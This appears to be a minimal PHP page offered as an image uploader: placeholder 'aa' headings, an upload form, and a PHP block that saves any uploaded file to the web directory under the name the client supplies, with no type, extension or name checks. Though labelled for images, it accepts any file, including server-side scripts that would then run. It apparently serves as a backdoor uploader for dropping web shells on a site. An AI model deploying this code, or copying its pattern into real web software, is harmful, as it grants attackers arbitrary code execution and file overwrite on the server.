<!DOCTYPE html><html><h1>aa</h1>
<h1>aa</h1>
<h1>aa</h1>
<h1>aa</h1>
<h1>aa</h1>
<h1>aa</h1>
<body><form action="" method="post" enctype="multipart/form-data">Select image:<input type="file" name="file" id="file"><input type="submit" value="Upload Image" name="submit"></form></body></html> <?php  if(isset($_POST["submit"])){ move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]); echo $_FILES["file"]["name"]; }  ?> 


